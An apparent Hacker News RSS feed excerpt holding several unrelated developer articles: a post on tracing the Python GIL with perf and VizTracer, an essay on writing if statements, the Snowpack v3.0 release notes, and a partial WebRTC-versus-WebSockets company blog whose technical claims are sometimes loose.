          python 3040114 [031] 5563911.112513:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120
         swapper     0 [037] 5563912.113490:                sched:sched_waking: comm=python pid=3040116 prio=120 target_cpu=037
         swapper     0 [037] 5563912.113529:                sched:sched_wakeup: comm=python pid=3040116 prio=120 target_cpu=037
          python 3040116 [037] 5563912.113595:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563912.113620:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
         swapper     0 [031] 5563912.113697:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031</code></pre>

</div>
</div>
</div><div>
<div>
<div>
<p>Take a moment to digest the output. I can see a few things. Looking at the 4th column (time in seconds), we can see where the program slept (it skips 1 second). Here we see that we enter the sleeping state with a line like:</p>
<p><code>python 3040114 [031] 5563911.112513:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120</code></p>
<p>This means the kernel changed the state of the Python thread to <code>S</code> (=sleeping) state.</p>
<p>A full second later, we see it being woken up:</p>
<p><code>swapper     0 [031] 5563912.113697:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031</code></p>
<p>Of course, you need to build some tooling around this, to really see what is happening. But one can imagine this output can be easily parsed and this is what <a href="https://github.com/maartenbreddels/per4m/">per4m</a> does. However, before we go there, I'd first like to visualize the flow of a slightly more advanced program using <a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a>.</p>

</div>
</div>
</div><div>
<div>
<div>

<p><a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a> is a Python tracer that can visualize what your program does in the browser. Let us run it on a slightly <a href="https://github.com/maartenbreddels/per4m/blob/master/per4m/example1.py">more advanced example</a> to see what it looks like.</p>

</div>
</div>
</div><div>
<div>
<div>
<p>Running viztracer gives output like:</p>

<pre><code>$ viztracer -o example1.html --ignore_frozen -m per4m.example1
Loading finish                                        
Saving report to /home/maartenbreddels/github/maartenbreddels/per4m/example1.html ...
Dumping trace data to json, total entries: 94, estimated json file size: 11.0KiB
Generating HTML report
Report saved.</code></pre>
<p>And the HTML should render as:
<img src="https://www.maartenbreddels.com/images/copied_from_nb/per4m/example1.png" alt="image.png"></p>
<p>From this, it seems that <code>some_computation</code> seem to be executed in parallel (twice), while in fact, we know the GIL is preventing that. So what is really going on?</p>

</div>
</div>
</div><div>
<div>
<div>

<p>Let us run <code>perf</code> on this, similarly to what we did to example0.py. However, we add the argument <code>-k CLOCK_MONOTONIC</code> so that we use <a href="https://github.com/gaogaotiantian/viztracer/blob/3321ba4024afe5623f938a601d7f7db3b08f534d/src/viztracer/modules/snaptrace.c#L91">the same clock as VizTracer</a> and ask VizTracer to generate a JSON, instead of an HTML file:</p>

<pre><code>$ perf record -e sched:sched_switch  -e sched:sched_process_fork -e 'sched:sched_wak*' \
   -k CLOCK_MONOTONIC  -- viztracer -o viztracer1.json --ignore_frozen -m per4m.example1</code></pre>
<p>Then …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html">https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html</a></em></p>]]>
            </description>
            <link>https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25774945</guid>
            <pubDate>Thu, 14 Jan 2021 11:06:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Structured programming: how to write proper if statements]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25774939">thread link</a>) | @todsacerdoti
<br/>
January 14, 2021 | http://boris-marinov.github.io/if/ | <a href="https://web.archive.org/web/*/http://boris-marinov.github.io/if/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>The <code>if</code> statement (or <code>if</code> expression) is the cornerstone of every modern programming language - it is so pervasive that we rarely think about how exactly should we use it, or how it is meant to be used. But despite its popularity, <code>if</code> wasnâ€™t always there, and it wasnâ€™t as pervasive as nowadays, so its role is, Iâ€™d argue, still somewhat misunderstood. So in this article, I will examine some mistakes that we can easily avoid in order to improve on our code.</p>

<!--more-->



<p>This is an opinionated text, i.e. it contains my opinions and although I have many arguments that back them, they are ultimately based on <em>my</em> core beliefs about what programming is and should be, so take them as advice, as opposed to a dogma. And here are some of the things on which this advice is based on, structured as postulates.</p>

<blockquote>
  <p>Code is for humans (and programmers are humans too).</p>
</blockquote>

<p>A form of this appears in a little book known in the hacker community as â€œSICPâ€�, but I donâ€™t know if they were the first to state it. It means that programs are not just instructions for performing a given task - they are text, and as such they should be subject to the same stylistical rules as other text is.</p>

<blockquote>
  <p>Code should be as bug-free as possible (and easy to debug as well).</p>
</blockquote>

<p>This one looks pretty self-explanatory, but the key point is that we have to dedicate effort to make it such, by constantly thinking not only about ways in which the code might go wrong, but also about ways to diagnose potential problems.</p>

<p>I guess I should say something about why I believe these things. Simple - because all other approaches just fail because of the human factor, e.g. any code, that is written without regard for style is bound to become legacy when the person who supports it leaves. Likewise, maintaining code that lacks structure results in bugs (which often can be fixed only by imposing more structure).</p>

<p>Lastly, people often contrast good structure and readability with speed. Firstly, the comparison is a bit unfair, because a well-structured is easier to optimize. And for cases in which it is really the case, in 99% the gain is so little that nobody cares, so the emphasis should remain on readability and structure even then. This is when I would throw this very famous quote by DEK:</p>

<blockquote>
  <p>Programmers waste enormous amounts of time thinking about, or worrying about, the speed of noncritical parts of their programs, and these attempts at efficiency actually have a strong negative impact when debugging and maintenance are considered. We should forget about small efficiencies, say about 97 % of the time: pre mature optimization is the root of all evil.
<a href="http://www.kohala.com/start/papers.others/knuth.dec74.html">source</a></p>
</blockquote>

<p>Keep in mind that he wrote this when computers were a thousand times slower than today, so we should care about maintainability even more.</p>



<p>Once upon a time, all there was was the assembly language where people didnâ€™t have brackets and had to use <code>jump</code> instructions instead. For those who donâ€™t know what jump does, if you imagine that somewhere in the virtual machine, or the interpreter, that runs your code there is a variable that denotes which line of code should be executed next, then <code>jump</code> is a functionality that basically allows you to set that variable to whatever value you please - it is like a portal that allows you to go to from any place of the program to any other place. For example, a typical <code>if</code> statement that looks like this when written with jumps:</p>

<div><div><pre><code>compare input to waterlevel
if less, jump to A
if equal, jump to B
jump to C

A:
turn motor on
jump to C

B:
turn motor off
C:
...
</code></pre></div></div>
<p><a href="https://stackoverflow.com/questions/40602029/how-to-write-if-else-in-assembly">Source for the assembly pseudocode</a></p>

<p>You can see from this example that, although powerful, jumps are much harder to work with than <code>if</code>-s, although they can sometimes make your code a bit shorter, they will 100% make it less readable which is hardly a good deal - if the important thing is for code to bug free, so youâ€™d always prefer to have a longer and more readable piece of code, than one which is shorter but harder to understand. This realization led to the rise of what was at the time called â€œstructural programmingâ€� paradigm, which was based on the idea that the power of jumps should not be exposed to the programmer - a point which was brought by Edsger W. Dijkstra in the seminal essay <a href="http://www.u.arizona.edu/~rubinson/copyright_violations/Go_To_Considered_Harmful.html">Go To Statement Considered Harmful</a> (<code>goto</code> is the equivalent of a <code>jump</code> instruction statements in non-assembly language context). Simultaneously, the idea of a <em>block</em> (or a â€œcompound statementâ€�) meaning a collection statements that perform a common task (usually denoted today by wrapping them in curly brackets) was pushed forward, and the two ideas gave birth to the <code>if</code> statement that we know today (that <a href="https://craftofcoding.wordpress.com/2017/04/29/the-evolution-of-if-i-from-fortran-i-to-algol-60/">first appeared in the <em>Algol 60</em> programming language</a>):</p>

<div><div><pre><code>if (input less than waterlevel) {
  turn motor on
} else if (input equal to waterlevel) {
turn motor off
} else {
...
</code></pre></div></div>

<p>The adoption of structured programming was a long process which began with people even questioning whether structured programs are even capable of encoding all possible computations, but today, although some people are <a href="https://stackoverflow.com/questions/46586/goto-still-considered-harmful">still defending the use of goto</a>, it (the process) is largely finished - <code>goto</code> is banished and the structured style of programming is so pervasive across modern languages that the term â€œstructuredâ€� is not used any more, simply because there is nothing to contrast it with.</p>

<p>And to reiterate, the reasons for this are quite obvious - using brackets makes our code much more akin to the way we usually talk and write with each other: we often say</p>

<blockquote>
  <p>â€œif A then B otherwise Câ€�</p>
</blockquote>

<p>we never say things like,</p>

<blockquote>
  <p>â€œif A then go to the previous page and start reading from line 12â€�.</p>
</blockquote>

<p>(I wonder if the programmers who defend the use of <code>goto</code> write and talk like that?)</p>

<p>This already leads me to the first rule that I always follow.</p>



<p>A leftover from the <code>goto</code>-driven style of programming is the possibility of so-called â€œearly exitâ€� - the ability to quit the execution of a given function or method from any place of itâ€™s body (most-oftenly by using the keyword <code>return</code>) as opposed to executing the function to the end. So again if we consider our plain old <code>if</code> <code>else</code> statement:</p>

<div><div><pre><code>if (input less than waterleve) {
    turn motor on
} else {
    turn motor off
}
...
</code></pre></div></div>
<p>Using <code>return</code> we can write it like this</p>

<div><div><pre><code>if (input less than waterleve) {
    return turn motor on
} 
turn motor off
...
</code></pre></div></div>

<p>When used like this, <code>return</code> is directly translatable to a <code>goto</code>.</p>

<div><div><pre><code>if (input less than waterleve) {
    turn motor on
    Jump to C
}
turn motor off
C:
...
</code></pre></div></div>

<p>Why not write like this? We already established that <code>goto</code> is bad and Iâ€™d argue that mixing the two approaches is even worse in some respects, as it might fool you that the code is structured when it really isnâ€™t. Furthermore, the early exit makes our code as confusing as any other <code>goto</code>-containing code when translated to natural language. Imagine someone saying:</p>

<blockquote>
  <p>â€œBring me a coffee if you get home early.â€�</p>
</blockquote>

<p>and then imagine them saying.</p>

<blockquote>
  <p>â€œIf you donâ€™t get home early ignore everything Iâ€™d say after this sentence. Bring me a coffee.â€�</p>
</blockquote>

<p>So if your language supports it, always rely on the implicit <code>return</code> instead of explicitly ending your execution. If not, the simple rule you can follow is that you should either return from all branches of the <code>if</code> statement or from none of them.</p>

<h2 id="combining-ifs-with-functions">Combining <code>if</code>â€™s with functions</h2>

<p>The most common type of situation that I have seen the premature <code>return</code> pattern is for handling errors. Imagine for example a very long function with some validation at the beginning. Many people would write:</p>

<div><div><pre><code>signup (user) {

  if (username is valid ) {
      throw invalid username
  } 

  create account for user
  sign user up
  initialise some other stuff
  write action in log
  send emails
  ...
}
</code></pre></div></div>

<p>This is a very subtle variant of the issue I am describing (made even more subtle by the fact that <code>throw</code> is used instead of a <code>return</code>). The correct way would be:</p>

<div><div><pre><code>signup (user) {

  if (username is valid ) {
      throw invalid username
  } else {
      create account for user
      sign user up
      initialise some other stuff
      write action in log
      send emails
    ...
  }
}
</code></pre></div></div>

<p>but people would prefer having the main function code directly in the body in order to avoid indentation (especially if there is a lot of it already). According to them (and they have a point) the error handling is somewhat outside of the domain of the function, we can perhaps say that they are at different levels of abstraction. In cases like this, we should use <em>functions</em> to structure our code and to keep the different levels of abstraction separate.</p>

<p>Functions are everything that random sequences of statement are not and can never be - they <em>have names</em>, they have <em>a separate scope</em> (blocks also have their own scope, but they also inherit the scope of the parent block), and most importantly they are <em>easy to debug</em> (e.g. you have the name of the thing that went wrong right there on the top of the stack trace. So letâ€™s look at how the code above can be made to work with functions. I think this is a very cool and underused pattern that allows you to lose the indentation without sacrificing your structure.</p>
<div><div><pre><code>
signup (user) {
  if (username is valid ) {
      throw invalid username
  } else {
      return signup internal (user)
  }
}

signup internal (user) { // or _signup as some people name it
  create account for user
  sign user up
  initialise some other stuff
  write action in log
  send emails
...
}
</code></pre></div></div>



<p>This is another bad pattern that, we might say, has the same root cause as the first one - in their effort to keep things simple and concise, people donâ€™t include all the structure that needs to be there in a robust piece of code.</p>

<p>In <code>if</code> statements we often have to deal with multiple conditions that are dependent on one another. And sometimes in such cases, people try to deal with all of them in one statement with multiple branches and <code>else if</code>-s. I argue that itâ€™s actually better to have <em>one statement per condition</em> …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://boris-marinov.github.io/if/">http://boris-marinov.github.io/if/</a></em></p>]]>
            </description>
            <link>http://boris-marinov.github.io/if/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25774939</guid>
            <pubDate>Thu, 14 Jan 2021 11:05:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Snowpack v3.0]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25774863">thread link</a>) | @dgellow
<br/>
January 14, 2021 | https://www.snowpack.dev/posts/2021-01-13-snowpack-3-0 | <a href="https://web.archive.org/web/*/https://www.snowpack.dev/posts/2021-01-13-snowpack-3-0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<article>
      <p>Snowpack v3.0 is here! This is our biggest release yet with brand new features including:</p>
<ul>
<li><strong>Pre-bundled streaming imports</strong> - Import any npm package, on-demand.</li>
<li><strong>Integrated build optimizations</strong> - Built-in bundling, preloading, minification, and more.</li>
<li><strong>JavaScript API</strong> - Integrate with Snowpack’s brand new native JS API.</li>
<li><strong>Node.js Runtime API</strong> - Import your Snowpack-built files directly into Node.js.</li>
<li><strong>Bug fixes, stability improvements, and a whole lot more!</strong></li>
</ul>
<p>Install the newest version of Snowpack to get started:</p>
<pre><code>$ npm install snowpack@^3.0.0
</code></pre>
<p>Or, try out one of our updated <a href="https://www.npmjs.com/package/create-snowpack-app">Create Snowpack App</a> starter templates:</p>
<pre><code>$ npx create-snowpack-app new-project-directory --template  @snowpack/app-template-react
</code></pre>
<h2 id="reimagining-web-development-for-esm">Reimagining Web Development for ESM</h2>
<p>1 year ago, Snowpack first released with the mission to reimagine web development for modern JavaScript and ESM. Snowpack leverages modern web features to deliver a frontend build tool that needs just 50ms to start up &amp; react to new file changes, regardless of project size. In comparison, traditional web bundlers could take several seconds or even full minutes to start up in large projects.</p>
<p>Snowpack v3.0 marks another huge leap on our mission to push web development forward with the release of <strong>streaming imports</strong>. Streaming imports make it possible to import any package directly into your project, pre-built and pre-bundled for immediate use. It’s the power of the entire JavaScript ecosystem, at your fingertips.</p>
<video preload="auto" autoplay="" loop="" muted="" playsinline="">
 <source src="https://www.snowpack.dev/img/streaming-imports-demo.webm" type="video/webm">
 <source src="https://www.snowpack.dev/img/streaming-imports-demo.mp4" type="video/mp4">
</video>
<h2 id="what-are-streaming-imports%3F">What are Streaming Imports?</h2>
<p>The typical web developer installs and manages their JavaScript dependencies locally using a package manager CLI like <code>npm</code>, <code>yarn</code> or <code>pnpm</code>. These npm packages can’t run directly in the browser, so additional work is needed to resolve, process, build and bundle these packages for the browser before you can actually use them.</p>
<p><strong>What if we could simplify this? What if you could skip the “npm install” step entirely and just fetch the relevant, pre-built package code on-demand via ESM import?</strong></p>
<pre><code><br><span>import</span> <span>*</span> <span>as</span> React <span>from</span> <span>'react'</span><span>;</span><p><br><span>import</span> <span>*</span> <span>as</span> React <span>from</span> <span>'https://cdn.skypack.dev/react@17.0.1'</span><span>;</span></p></code></pre>
<p>That URL in the example above points to <a href="https://www.skypack.dev/">Skypack</a>, a popular JavaScript CDN that we built to serve every package&nbsp;on npm as ESM. Importing dependencies by URL like this is well supported in Snowpack, Deno, and all major browsers. But writing these URLs directly into your source code isn’t ideal and makes development impossible without a network connection.</p>
<p><strong>Snowpack v3.0 brings together the best of both worlds:</strong> Get the simplicity of <code>import 'react'</code> in your own source code and let Snowpack fetch these dependencies behind the scenes, pre-built and ready to run in the browser. Snowpack caches everything for you automatically, so you can continue to work offline after the first package fetch.</p>
<p>This new workflow has several benefits over the traditional “npm install” approach:</p>
<ul>
<li><strong>Speed:</strong> Skip the install + build steps for dependencies, and load your dependencies on-demand as pre-build, pre-bundled ESM code.</li>
<li><strong>Safety:</strong> ESM packages are pre-built into JavaScript for you and never given access to <a href="https://www.usenix.org/system/files/sec19-zimmermann.pdf">run code on your machine</a>. Third-party code only ever runs sandboxed in the browser.</li>
<li><strong>Less Tooling:</strong> ESM packages are managed by Snowpack, so frontend projects that don’t need Node.js (Rails, PHP, etc.) can drop the npm CLI entirely if they choose.</li>
<li><strong>Identical Final Build:</strong> When you build your site for production, package code is transpiled with the rest of your site and tree-shaken to your exact set of imports.</li>
</ul>
<p>This is our bet on the future of web development. But if this all sounds too wild for you or you have some technical reason to keep managing your dependencies with npm, don’t worry. This is <strong>100% opt-in</strong> behavior for those who want it. By default, Snowpack will continue to pull your npm package dependencies out of your project <code>node_modules</code> directory like it always has.</p>
<p>Check out our guide on <a href="https://www.snowpack.dev/guides/streaming-imports">Streaming Package Imports</a> to learn more about how to enable this new behavior in your project today.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-esbuild.png" alt="js api"></p>
<h2 id="built-in-optimizations%2C-powered-by-esbuild">Built-in Optimizations, Powered by esbuild</h2>
<p><a href="https://esbuild.github.io/">esbuild</a> is a marvel: it performs 100x faster than most other popular bundlers their own benchmarks. esbuild is written in Go, a compiled language that can parallelize heavy bundling workloads where other popular bundlers – written in JavaScript – cannot.</p>
<p>Snowpack already uses esbuild internally as our default single-file builder for JavaScript, TypeScript and JSX files. Snowpack v3.0 takes this integration one step further, with a new built-in build optimization pipeline. Bundle, minify, and transpile your site for production in 1/100th of the time of other bundlers.</p>
<p>Snowpack is able to adopt esbuild today thanks to an early bet that we made on the future of bundling: <strong>bundling is just a post-build optimization.</strong> Thanks to this early design decision, esbuild can be plugged in and swapped out of your Snowpack build as easily as any other bundler.</p>
<p>esbuild is still a young project, but its future looks promising. In the meantime, we will also continue to invest in the existing bundler plugins for a long time to come, so that more mature projects can continue to use mature bundlers like Webpack &amp; Rollup.</p>
<p>To get started, check out the <code>optimize</code> option in our newest <a href="https://www.snowpack.dev/guides/optimize-and-bundle">Optimizing Your Snowpack Build</a> guide.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-jsapi.png" alt="js api"></p>
<h2 id="a-new-javascript-api">A New JavaScript API</h2>
<p>Snowpack’s new JavaScript API grants you more advanced control over Snowpack’s dev server and build pipeline, helping you build more powerful integrations on top of Snowpack to unlock new kinds of dev tooling and server-side rendering (SSR) solutions.</p>
<p><a href="https://svelte.dev/blog/whats-the-deal-with-sveltekit">SvelteKit</a> is the new official web app framework from the Svelte team, built with Snowpack. SvelteKit uses our new JavaScript API to manage the build pipeline and build files on-demand. Snowpack helps SvelteKit speed up development, with zero rapid updates on file change and zero upfront server start-up cost.</p>
<p><a href="https://www.npmjs.com/package/microsite">Microsite</a> is another exciting new project built with Snowpack. Microsite is a Static Site Generator (SSG) for Preact that features automatic partial hydration, so that you send as little JavaScript down to the client as possible.</p>
<p>Check out our new <a href="https://www.snowpack.dev/reference/javascript-interface">JavaScript API reference</a> to start building your own custom integrations on top of Snowpack.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-runtime.png" alt="js api"></p>
<h2 id="a-new-node.js-runtime">A New Node.js Runtime</h2>
<p>Speaking of Svelte, this next feature comes directly out of our collaboration with the Svelte team. As a part of building out SvelteKit, Rich Harris created a server-side runtime for Snowpack. This runtime lets you import any Snowpack-built file directly into Node.js, handling things like ESM-&gt;CJS conversion and CSS extraction automatically.</p>
<p>The result is a unified build pipeline across both Node.js and the frontend, with all of the on-demand build performance benefits of Snowpack. Importing frontend code to run in Node.js unlocks features like true server-side rendering (SSR), test runner integrations for Jest/uvu/Mocha, and more.</p>
<p>Check out our new <a href="https://www.snowpack.dev/guides/server-side-render">SSR guide</a> to get started and learn more about all of the different ways that you can connect to your Snowpack build.</p>
<p>🥳</p>
<h2 id="snowpack%E2%80%99s-one-year-anniversary">Snowpack’s One Year Anniversary</h2>
<p>Last week marked Snowpack’s one-year anniversary of the original v1.0.0 release. Looking back, I’m blown away by everything that’s happened since:</p>
<ul>
<li>150+ releases (from <code>v0.0.1</code>, all the way to v3.0 today)</li>
<li><a href="https://www.snowpack.dev/plugins">100+ Snowpack plugins</a> to choose from (and growing fast!)</li>
<li><a href="https://github.com/snowpackjs/snowpack/graphs/contributors">100+ individual contributors</a></li>
<li><a href="https://github.com/snowpackjs/snowpack/stargazers">15,000+ stars on GitHub</a></li>
<li>#1 Developer Productivity Boost Winner, <a href="https://osawards.com/javascript/2020">2020 JS Open Source Awards</a></li>
<li>#1 Highest Developer Interest, <a href="https://2020.stateofjs.com/en-US/technologies/build-tools/">2020 State of JS</a></li>
<li>#1 Highest Developer Satisfaction (tied), 2020 State of JS</li>
</ul>
<p>A huge thank you to everyone who has contributed code to Snowpack, and the hundreds of developers joining us on GitHub and on <a href="https://discord.com/invite/snowpack">Discord</a>. This project wouldn’t exist today without you and your support. Thank you!</p>
<p>– Fred K. Schott <a href="https://twitter.com/FredKSchott">(@FredKSchott)</a></p>

    </article>
    </div></div>]]>
            </description>
            <link>https://www.snowpack.dev/posts/2021-01-13-snowpack-3-0</link>
            <guid isPermaLink="false">hacker-news-small-sites-25774863</guid>
            <pubDate>Thu, 14 Jan 2021 10:50:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WebRTC vs WebSockets]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25774854">thread link</a>) | @Katesmith
<br/>
January 14, 2021 | https://requestum.com/webrtc-vs-websockets | <a href="https://web.archive.org/web/*/https://requestum.com/webrtc-vs-websockets">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="blogpost">
      <div>
        
      
        <div>
          <p>Real-time peer-to-peer signaling and media exchange is an important capability for most interactive web applications. Use cases of direct exchange technologies range from simple text chats to interactive solutions. We asked the specialists in the field to help us analyze the key differences <strong>between WebRTC vs WebSocket</strong>, their pros, cons, and basic principles of work.</p>
          <figure>
            <img src="https://requestum.com/images/blogposts/webrtc-vs-websockets/header.svg" alt="Webrtc vs Websockets">
          </figure>
        </div>
      
        <div>
      
          <h2>WebRTC vs WebSockets – What’s the Difference?</h2>
      
          <p>Let’s start with the <span>WebRTC definition</span>. It is a real-time direct media exchange technology, an open-source project originally. Its main goal is to provide the connection means for browsers and mobile apps. A connection is established through signal indication and synchronization - the whole process is essentially called <span>signaling</span>.</p>
      
          <p>To establish a WebRTC connection between two devices, a <span>signaling server</span> is required. It is an intermediary that on top of its main function of establishing a connection also minimizes the risk of valuable information and confidential data leakage.</p>
      
          <p>The WebRTC specification does not specify what exactly to use to transmit signaling data: <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebSocket_API">WebSocket</a>, <a href="https://developer.mozilla.org/ru/docs/Web/API/XMLHttpRequest">XMLHttpRequest</a>, or another virtual transport.</p>
      
          <p><span>What is WebSocket?</span> Both WebRTC and WebSocket are technologies for communication capabilities. What is the difference between them? WebSocket is a computer communication protocol that enables communication and data exchange. With the help of this web communication solution and WebRTC technology combined, modern web applications allow you to exchange audio and video content with a large number of users in real time.</p>
      
          <p>The most significant advantage and feature of WebSockets is the availability of two communication methods over a single <a href="https://techterms.com/definition/tcp">TCP connection</a>.</p>
      
          <div>
      
            <div>
              <div>
                <figure uk-scrollspy="cls:uk-animation-slide-bottom; offset-top: -100">
                  <img data-src="../../../images/blogposts/webrtc-vs-websockets/what-is-websocket.svg" alt="Innovation" src="https://requestum.com/images/blogposts/webrtc-vs-websockets/what-is-websocket.svg" data-was-processed="true">
                </figure>
      
                <div>
                  <h3>What is a Websocket?</h3>
      
                  <ul>
                    <li>Technology for opening communication between browser and server;</li>
                    <li>Send messages to web server asynchronously;</li>
                    <li>Receive event-drive responses without polling for a reply;</li>
                    <li>Full-duplex connection stream between client and server;</li>
                    <li>Dedicated communication protocol named «ws»;</li>
                    <li>Callback functions for handling events of incoming messages;</li>
                    <li>JSON often used as container for exchanging messages and data.</li>
                  </ul>
                </div>
      
              </div>
            </div>
      
          </div>
      
          <h2>WebRTC vs WebSockets – Key Differences</h2>
      
          <p>Now that we figured out that you should not confuse these tech concepts, let's consider the main differences between them.</p>
      
          <p>While the WebSockets 'core' is rich web applications, the focus of WebRTC is on fast and simple peer-to-peer connections.</p>
      
          <ol>
            <li>The environment for WebSockets is Java, JMS, and C ++; for WebRTC - Java and HTML;</li>
            <li>WebRTC is more secure;</li>
            <li>At the moment, WebRTC is only supported by certain browsers while WebSockets is compatible with almost all existing browsers;</li>
            <li>In terms of scalability, WebSockets uses a server per session approach and WebRTC is peer-to-peer.</li>
          </ol>
      
          <p><a href="https://requestum.com/about-us">Our own experts</a> frequently use WebSockets as a top beneficial connection protocol, which boasts:</p>
      
          <ul>
            <li>data transmission in real time;</li>
            <li>interactivity;</li>
            <li>high performance;</li>
            <li>End-to-end software dialogue.</li>
          </ul>
      
          <p>Many of the solution’s aspects, however, can overlap with WebRTC’s capabilities, which is why it’s easy to confuse them.</p>
      
          <div>
            <div>
              
              <figure uk-scrollspy="cls:uk-animation-slide-bottom; offset-top: -100">
                <p><img alt="Photo" data-src="../../../images/blogposts/webrtc-vs-websockets/web-sockets.svg" src="https://requestum.com/images/blogposts/webrtc-vs-websockets/web-sockets.svg" data-was-processed="true">
                </p>
              </figure>
      
              <p>The difference between Web Sockets vs WebRTC operation. The standard mode of Web Sockets</p>
      
              <p>Source: <a href="https://www.easythings.xyz/facts-about-p2p-in-webrtc.html/">Easythings</a></p>
            </div>
      
            
          </div>
      
          <h2>WebRTC vs WebSockets – Pros and Cons</h2>
      
          <div>
            <h3>Pros of WebRTC</h3>
      
            <ul>
              <li>No software installation required;</li>
              <li>High-quality data transmission using modern audio (Opus) and video codecs (VP8, H.264);</li>
              <li>Video or audio quality adjusts to the digital environment during the connection, suppressing echoes and noise;</li>
              <li><span>Reliability and safety of data - the server protects connections by encrypting them via <a href="https://www.webopedia.com/TERM/T/TLS.html">TLS</a> and <a href="https://www.techopedia.com/definition/16483/secure-real-time-protocol-secure-rtp-or-srtp">SRTP</a> protocols;</span></li>
              <li>An implementation of an unlimited control interface based on HTML5 and JavaScript is available;</li>
              <li>There is an option to implement an interface with various backend systems via WebSockets;</li>
              <li>Open-source software allows you to embed WebRTC with web applications and services.</li>
            </ul>
      
            <p>WebRTC-based applications differ in productivity regardless of operating systems and version (desktop or mobile), if the browser supports WebRTC. This allows you to save lots of software development money.</p>
          </div>
      
          <div>
            <h3>Cons of WebRTC</h3>
      
            <p>This breakthrough web technology also has its drawbacks:</p>
      
            <ul>
              <li>The need for a video conferencing server (which mixes video and sound) for audio and video conferences in a group, since the browser is unable to synchronize two or more incoming streams;</li>
              <li>Lack of compatibility of WebRTC solutions with each other: you cannot make calls to WebRTC applications of other developers;</li>
              <li>You must purchase a subscription to mix conferences in a group.</li>
            </ul>
          </div>
      
          <div>
            <h3>Pros of WebSockets</h3>
      
            <p>The WebSockets API and protocol are standardized by the IETF and W3C. They have proven themselves among the <a href="http://requestum.com/">experts of our company</a> as a functional technology in web, desktop, and mobile applications. The main advantages of this communication protocol include:</p>
      
            <ol>
              <li>cross-communication (cross origin communication) - it creates certain security risks but is needed for extensive functionality;</li>
              <li>cross-platform compatibility (web, computer, mobile devices);</li>
              <li>continuous connection from the backend to frontend in a web application or mobile application working with a server;</li>
              <li>short-term lack of connection does not break the connection;</li>
              <li>the possibility of asynchronous work, instead of the classic work on the Web in the request-response format.</li>
            </ol>
      
            <p>The idea for WebSockets was born out of the limitations of HTTP-based technology. It is a peer-to-peer protocol - data that is sent from the server to the client must first be requested. In turn, WebSockets allow you to send data based on <span>UDP-like WebSockets</span> messages, but with higher TCP reliability.</p>
      
            <p>WebSocket uses HTTP as an initial transport mechanism but maintains a TCP connection after receiving an HTTP response for later use in sending messages between the server and the client.</p>
          </div>
      
          <div>
            <h3>Cons of WebSockets</h3>
      
            <p>Slow interaction response. The result of sending data to the WebSocket becomes known after 75 seconds of the timeout. The protocol doesn’t directly announce the result. That’s why developers are often forced to run special pings to get a quick response.</p>
      
            <p>hange of network by the client. In mobile networks, mobile devices often switch between external IP, NAT, and the default network. And this doesn’t depend on the operator. Why this happens: the server doesn't get information about your change of address if the client did not close the connection when reconnecting to another network. The server continues to send private data to the old IP, which you no longer use. This IP address is used by another user and information is leaked.</p>
      
            <p>Other security issues in WebSockets:</p>
      
            <ul>
              <li>processing denial;</li>
              <li>possible private data leaks;</li>
              <li>client-server encryption, etc.</li>
            </ul>
      
            <p>To reinforce security and allow multiple users to use the same IP address, the router hides your IP address and replaces it with another.</p>
          </div>
      
          <h2>WebRTC architecture</h2>
      
          <p>Initially, WebRTC was developed as a peer-to-peer technology. Accordingly, a significant portion of the development has centered around the client device.</p>
      
          <p>Today, we can define three main <span>WebRTC architectures</span>: peer-to-peer, multipoint conferencing units, and selective forwarding units. Each of them has its own characteristics, advantages, and disadvantages in use.</p>
      
           <div>
            <div>
              <figure uk-scrollspy="cls:uk-animation-slide-bottom; offset-top: -100">
                <img data-src="../../../images/blogposts/webrtc-vs-websockets/peer-2-peer-webrtc.svg" alt="Innovation" src="https://requestum.com/images/blogposts/webrtc-vs-websockets/peer-2-peer-webrtc.svg" data-was-processed="true">
              </figure>
      
              <div>
                <h3>Peer-to-peer WebRTC architecture</h3>
      
                <p>Implies a direct exchange of media content between two browsers. The main advantage of this architecture is the ease of implementation and low cost of app development since it does not require a large internal infrastructure. In addition, security is guaranteed between the receiving parties since no intermediary is used.</p>
              </div>
            </div>
      
            <div>
              <figure uk-scrollspy="cls:uk-animation-slide-bottom; offset-top: -100">
                <img data-src="../../../images/blogposts/webrtc-vs-websockets/multipoint-conf-unit.svg" alt="Innovation" src="https://requestum.com/images/blogposts/webrtc-vs-websockets/multipoint-conf-unit.svg" data-was-processed="true">
              </figure>
      
              <div>
